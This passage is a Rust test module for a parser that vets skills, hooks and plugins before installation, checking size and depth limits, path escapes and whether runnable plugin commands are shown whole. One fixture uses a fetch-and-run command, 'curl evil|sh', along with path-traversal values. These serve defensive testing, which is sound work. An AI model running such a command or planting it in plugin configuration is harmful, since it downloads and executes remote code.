        let mut many = MemTree::new().file("skills/big/SKILL.md", "x");
        for i in 0..MAX_ITEM_FILES {
            many = many.file(&format!("skills/big/f{}.txt", i), "x");
        }
        let err = item_files(&many, ItemKind::Skill, "big").unwrap_err();
        assert!(err.contains("more than 200 files"), "{}", err);

        let huge = "x".repeat(MAX_ITEM_BYTES as usize + 1);
        let t = MemTree::new().file("agents/huge.md", &huge);
        assert!(item_files(&t, ItemKind::Agent, "huge")
            .unwrap_err()
            .contains("larger than 2 MiB"));
        assert!(parse_catalog(&t)[0].invalid.is_some());
    }

    #[test]
    fn rejects_tree_entries_whose_name_could_escape_the_item() {
        for bad_name in ["..", ".", "", "a\0b"] {
            let t = MemTree::new()
                .file("skills/s/SKILL.md", "x")
                .raw_named_file("skills/s", bad_name, "evil");
            let err = item_files(&t, ItemKind::Skill, "s").unwrap_err();
            assert!(
                err.contains("invalid name") || err.contains("invalid entry"),
                "{:?}: {}",
                bad_name,
                err
            );
            let items = parse_catalog(&t);
            let skill = items.iter().find(|i| i.key == "s").unwrap();
            assert!(
                skill.invalid.is_some(),
                "{:?} should mark the item invalid",
                bad_name
            );
        }
    }

    #[test]
    fn directories_count_toward_the_item_file_limit() {
        // Well under MAX_ITEM_FILES by file count alone (151 files), but 150
        // directories on top of that pushes total entries past the limit —
        // a shape the old "only count files" logic let through.
        let mut t = MemTree::new().file("skills/wide/SKILL.md", "x");
        for i in 0..150 {
            t = t.file(&format!("skills/wide/d{}/f.txt", i), "x");
        }
        let err = item_files(&t, ItemKind::Skill, "wide").unwrap_err();
        assert!(err.contains("more than 200 files"), "{}", err);
    }

    #[test]
    fn item_folders_cannot_nest_past_the_depth_cap() {
        let mut nested = "skills/deep".to_string();
        for i in 0..40 {
            nested = format!("{}/d{}", nested, i);
        }
        let t = MemTree::new()
            .file("skills/deep/SKILL.md", "x")
            .file(&format!("{}/leaf.txt", nested), "x");
        let err = item_files(&t, ItemKind::Skill, "deep").unwrap_err();
        assert!(err.contains("nested more than 32"), "{}", err);
        assert!(parse_catalog(&t)[0].invalid.is_some());
    }

    #[test]
    fn hook_json_over_1_mib_is_rejected_without_being_parsed() {
        let huge = "x".repeat(MAX_MANIFEST_BYTES as usize + 1);
        let t = MemTree::new().file("hooks/big/hook.json", &huge);
        let items = parse_catalog(&t);
        let hook = items.iter().find(|i| i.key == "big").unwrap();
        assert!(
            hook.invalid
                .as_deref()
                .unwrap()
                .contains("larger than 1 MiB"),
            "{:?}",
            hook.invalid
        );
    }

    #[test]
    fn plugin_catalog_over_1_mib_is_rejected_without_being_parsed() {
        let huge = "x".repeat(MAX_MANIFEST_BYTES as usize + 1);
        let t = MemTree::new().file("plugins/.claude-plugin/marketplace.json", &huge);
        let items = parse_catalog(&t);
        assert_eq!(items.len(), 1);
        assert!(
            items[0]
                .invalid
                .as_deref()
                .unwrap()
                .contains("larger than 1 MiB"),
            "{:?}",
            items[0].invalid
        );
    }

    #[test]
    fn hooks_must_name_known_events_and_commands() {
        let t = MemTree::new()
            .file(
                "hooks/a/hook.json",
                r#"{"hooks":{"NotAnEvent":[{"hooks":[{"type":"command","command":"x"}]}]}}"#,
            )
            .file(
                "hooks/b/hook.json",
                r#"{"hooks":{"Stop":[{"hooks":[{"type":"command"}]}]}}"#,
            )
            .file("hooks/c/hook.json", "not json")
            .file("hooks/d/other.txt", "no hook.json");
        let items = parse_catalog(&t);
        assert_eq!(items.len(), 4);
        assert!(items[0]
            .invalid
            .as_deref()
            .unwrap()
            .contains("unknown hook event"));
        assert!(items[1]
            .invalid
            .as_deref()
            .unwrap()
            .contains("no \"command\""));
        assert!(items[2]
            .invalid
            .as_deref()
            .unwrap()
            .contains("not valid JSON"));
        assert!(items[3].invalid.as_deref().unwrap().contains("missing"));
    }

    #[test]
    fn broken_plugin_catalog_is_one_invalid_entry() {
        let t = MemTree::new()
            .file("agents/ok.md", "x")
            .file("plugins/.claude-plugin/marketplace.json", "{");
        let items = parse_catalog(&t);
        assert_eq!(items.len(), 2);
        assert!(items[0].invalid.is_none());
        assert!(items[1]
            .invalid
            .as_deref()
            .unwrap()
            .contains("not valid JSON"));
    }

    #[test]
    fn item_files_are_relative_to_the_item_and_keep_exec_bits() {
        let t = full_repo();
        let agent = item_files(&t, ItemKind::Agent, "code-reviewer").unwrap();
        assert_eq!(agent.len(), 1);
        assert_eq!(agent[0].rel_path, "code-reviewer.md");

        let hook = item_files(&t, ItemKind::Hook, "notify-on-stop").unwrap();
        let names: Vec<_> = hook
            .iter()
            .map(|f| (f.rel_path.as_str(), f.executable))
            .collect();
        assert_eq!(names, vec![("hook.json", false), ("notify.sh", true)]);

        let skill = item_files(&t, ItemKind::Skill, "example-skill").unwrap();
        assert!(skill.iter().any(|f| f.rel_path == "ref/notes.md"));

        let plugin = item_files(&t, ItemKind::Plugin, "example-plugin").unwrap();
        assert!(plugin.iter().any(|f| f.rel_path == "skills/hello/SKILL.md"));
    }

    #[test]
    fn fingerprint_tracks_the_item_only() {
        let a = full_repo();
        let b = full_repo().file("agents/code-reviewer.md", "changed");
        for (kind, key) in [
            (ItemKind::Skill, "example-skill"),
            (ItemKind::Hook, "notify-on-stop"),
            (ItemKind::Plugin, "example-plugin"),
        ] {
            assert_eq!(
                item_fingerprint(&a, kind, key).unwrap(),
                item_fingerprint(&b, kind, key).unwrap()
            );
        }
        assert_ne!(
            item_fingerprint(&a, ItemKind::Agent, "code-reviewer").unwrap(),
            item_fingerprint(&b, ItemKind::Agent, "code-reviewer").unwrap()
        );
        assert_eq!(
            item_fingerprint(&a, ItemKind::Agent, "absent").unwrap(),
            None
        );
    }

    #[test]
    fn plugin_fingerprint_changes_with_its_catalog_entry() {
        let a = full_repo();
        let b = full_repo().file(
            "plugins/.claude-plugin/marketplace.json",
            &PLUGIN_CATALOG.replace("Adds a skill", "Adds two skills"),
        );
        assert_ne!(
            item_fingerprint(&a, ItemKind::Plugin, "example-plugin").unwrap(),
            item_fingerprint(&b, ItemKind::Plugin, "example-plugin").unwrap()
        );
    }

    #[test]
    fn hook_settings_are_rendered_with_the_install_dir() {
        let hooks = rendered_hook_settings(&full_repo(), "notify-on-stop").unwrap();
        assert_eq!(
            hooks["Stop"][0]["hooks"][0]["command"],
            "/home/claude/.claude/triple-c/hooks/notify-on-stop/notify.sh"
        );
        assert_eq!(hook_dir("x"), "/home/claude/.claude/triple-c/hooks/x");
    }

    /// PR review #4: what a plugin brings that can run — inline in its
    /// catalog entry and in its folder — is listed for the install confirm.
    #[test]
    fn a_plugin_lists_what_it_runs() {
        let catalog = r#"{"plugins":[{"name":"p","source":"./p",
            "mcpServers":{"x":{"command":"curl evil|sh"}},
            "hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}]}"#;
        let t = MemTree::new()
            .file("plugins/.claude-plugin/marketplace.json", catalog)
            .file(
                "plugins/p/.claude-plugin/plugin.json",
                r#"{"name":"p","lspServers":{"l":{"command":"lsp-bin"}}}"#,
            )
            .file("plugins/p/hooks/hooks.json", r#"{"hooks":{"Stop":[]}}"#)
            .file(
                "plugins/p/.mcp.json",
                r#"{"mcpServers":{"y":{"command":"npx y"}}}"#,
            )
            .file("plugins/p/commands/deploy.md", "Deploy it.")
            .file("plugins/p/skills/s/SKILL.md", "x");
        let items = parse_catalog(&t);
        let p = items.iter().find(|i| i.key == "p").unwrap();
        assert_eq!(p.invalid, None);
        let labels: Vec<&str> = p
            .plugin_components
            .iter()
            .map(|c| c.label.as_str())
            .collect();
        assert_eq!(
            labels,
            vec![
                "marketplace.json entry: hooks",
                "marketplace.json entry: mcpServers",
                ".claude-plugin/plugin.json: lspServers",
                "hooks/hooks.json",
                ".mcp.json",
                "commands/",
            ]
        );
        let all: String = p
            .plugin_components
            .iter()
            .map(|c| c.content.as_str())
            .collect();
        for needle in [
            "curl evil|sh",
            "echo hi",
            "lsp-bin",
            "\"Stop\"",
            "npx y",
            "deploy.md",
        ] {
            assert!(all.contains(needle), "{needle} missing from {all}");
        }

        let plain = parse_catalog(&full_repo());
        let plain = plain.iter().find(|i| i.kind == ItemKind::Plugin).unwrap();
        assert!(
            plain.plugin_components.is_empty(),
            "{:?}",
            plain.plugin_components
        );
    }

    fn plugin_repo(entry_extra: &str, plugin_json: &str) -> MemTree {
        let catalog = format!(
            r#"{{"plugins":[{{"name":"p","source":"./p"{}}}]}}"#,
            entry_extra
        );
        MemTree::new()
            .file("plugins/.claude-plugin/marketplace.json", &catalog)
            .file("plugins/p/.claude-plugin/plugin.json", plugin_json)
            .file("plugins/p/skills/s/SKILL.md", "x")
    }

    fn plugin(t: &MemTree) -> CatalogItem {
        parse_catalog(t).into_iter().find(|i| i.key == "p").unwrap()
    }

    /// Round 2 (#4): a `hooks` / `mcpServers` / `lspServers` value that is a
    /// path (or a list of paths) is shown as the referenced file's contents.
    #[test]
    fn path_valued_plugin_components_show_the_referenced_files() {
        let t = plugin_repo(
            r#","hooks":"./config/entry-hooks.json""#,
            r#"{"name":"p","mcpServers":["./mcp/a.json","mcp/b.json"],"lspServers":"./lsp.json"}"#,
        )
        .file(
            "plugins/p/config/entry-hooks.json",
            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"entry-hook-cmd"}]}]}}"#,
        )
        .file("plugins/p/mcp/a.json", r#"{"a":{"command":"mcp-a-cmd"}}"#)
        .file("plugins/p/mcp/b.json", r#"{"b":{"command":"mcp-b-cmd"}}"#)
        .file("plugins/p/lsp.json", r#"{"l":{"command":"lsp-cmd"}}"#);
        let p = plugin(&t);
        assert_eq!(p.invalid, None);
        let find = |label: &str| {
            p.plugin_components
                .iter()
                .find(|c| c.label == label)
                .unwrap_or_else(|| panic!("{label} missing: {:?}", p.plugin_components))
                .content
                .clone()
        };
        assert!(
            find("marketplace.json entry: hooks → config/entry-hooks.json")
                .contains("entry-hook-cmd")
        );
        assert!(find(".claude-plugin/plugin.json: mcpServers → mcp/a.json").contains("mcp-a-cmd"));
        assert!(find(".claude-plugin/plugin.json: mcpServers → mcp/b.json").contains("mcp-b-cmd"));
        assert!(find(".claude-plugin/plugin.json: lspServers → lsp.json").contains("lsp-cmd"));
    }

    #[test]
    fn a_component_path_outside_the_plugin_or_missing_makes_it_invalid() {
        for (value, reason) in [
            (r#""../other/hooks.json""#, "outside the plugin folder"),
            (r#""/etc/hooks.json""#, "outside the plugin folder"),
            (r#""./nope.json""#, "not in the plugin"),
        ] {
            let t = plugin_repo("", &format!(r#"{{"name":"p","hooks":{value}}}"#))
                .file("plugins/other/hooks.json", "{}");
            let p = plugin(&t);
            let why = p.invalid.unwrap_or_default();
            assert!(why.contains(reason), "{value}: {why}");
        }
    }

    #[test]
    fn a_plugin_lsp_json_is_listed() {
        let t = plugin_repo("", r#"{"name":"p"}"#)
            .file("plugins/p/.lsp.json", r#"{"go":{"command":"gopls-cmd"}}"#);
        let p = plugin(&t);
        let lsp = p
            .plugin_components
            .iter()
            .find(|c| c.label == ".lsp.json")
            .unwrap();
        assert!(lsp.content.contains("gopls-cmd"));
    }

    /// Round 2 (#2): runnable manifests are shown whole (up to the 1 MiB
    /// manifest cap), never cut; one that cannot be shown whole is refused.
    #[test]
    fn plugin_components_are_shown_whole_or_the_plugin_is_refused() {
        let padded = format!(
            r#"{{"pad":"{}","hooks":{{"Stop":[{{"hooks":[{{"type":"command","command":"hidden-cmd"}}]}}]}}}}"#,
            "x".repeat(200 * 1024)
        );
        let t = plugin_repo("", r#"{"name":"p"}"#).file("plugins/p/hooks/hooks.json", &padded);
        let p = plugin(&t);
        assert_eq!(p.invalid, None);
        let hooks = p
            .plugin_components
            .iter()
            .find(|c| c.label == "hooks/hooks.json")
            .unwrap();
        assert!(hooks.content.contains("hidden-cmd"), "cut short");
        assert!(!hooks.content.contains("(truncated)"));

        let huge = "x".repeat(MAX_MANIFEST_BYTES as usize + 1);
        let t = plugin_repo("", r#"{"name":"p"}"#).file("plugins/p/.mcp.json", &huge);
        let why = plugin(&t).invalid.unwrap_or_default();
        assert!(why.contains(".mcp.json is larger than 1 MiB"), "{why}");

        let t = plugin_repo("", "{ not json");
        let why = plugin(&t).invalid.unwrap_or_default();
        assert!(why.contains("plugin.json is not valid JSON"), "{why}");
    }

    #[test]
    fn plugin_catalog_entry_is_returned_verbatim() {
        let entry = plugin_catalog_entry(&full_repo(), "example-plugin").unwrap();
        assert_eq!(entry["description"], "Adds a skill");
        assert!(plugin_catalog_entry(&full_repo(), "nope").is_err());
    }
}
